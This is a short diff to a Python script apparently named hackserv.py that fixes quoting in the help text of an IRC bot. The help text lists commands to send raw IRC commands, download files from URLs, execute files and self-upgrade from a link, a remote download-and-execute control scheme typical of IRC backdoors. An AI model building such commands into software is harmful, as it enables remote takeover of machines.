@@ -600,9 +600,9 @@ def main():
                                   '.mode [target] [mode]' (set mode on nick or channel),
                                   '.nick [newnick]' (sets a new botnick),
                                   '.raw [command]' (sends a raw command to the IRC server),
-                                  '.dl [url] [file] (downloads [url] and saves as [file]),
-                                  '.run [execute type] [executable file]' (execute a file),
-                                  '.upgrade [link] file]' (upgrades the hackserv.py file),
+                                  '.dl [url] [file]' (downloads [url] and saves as [file]),
+                                  '.run [execute type]' [executable file]' (execute a file),
+                                  '.upgrade [link] [file]' (upgrades the hackserv.py file),
                                   'Hi [botnick]' (responds to any user saying hello to it),
                                   'bye [botnick]' (tells bot to quit)
                                   """
